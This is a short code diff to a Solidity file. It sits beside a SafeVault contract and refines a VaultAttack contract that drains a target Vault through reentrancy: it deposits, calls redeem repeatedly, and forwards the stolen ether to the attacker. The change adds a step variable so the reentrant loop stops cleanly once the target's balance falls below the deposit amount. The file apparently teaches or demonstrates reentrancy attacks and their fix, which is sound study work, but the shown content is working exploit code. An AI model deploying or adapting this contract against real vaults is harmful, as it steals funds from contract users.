@@ -43,6 +43,7 @@ contract SafeVault {
 contract VaultAttack {
     Vault private _target;
     address private _owner;
+    uint private _step;
 
     constructor(address target) {
         _target = Vault(target);
@@ -50,13 +51,14 @@ contract VaultAttack {
     }
 
     function drain() private {
-        if (address(_target).balance > 0 ether) 
+        if (address(_target).balance >= _step) 
             _target.redeem();
         else
             _owner.call{value: address(this).balance}("");
     }
 
     function attack() payable external {
+        _step = msg.value;
         _target.store{value: msg.value}();
         drain();
     }
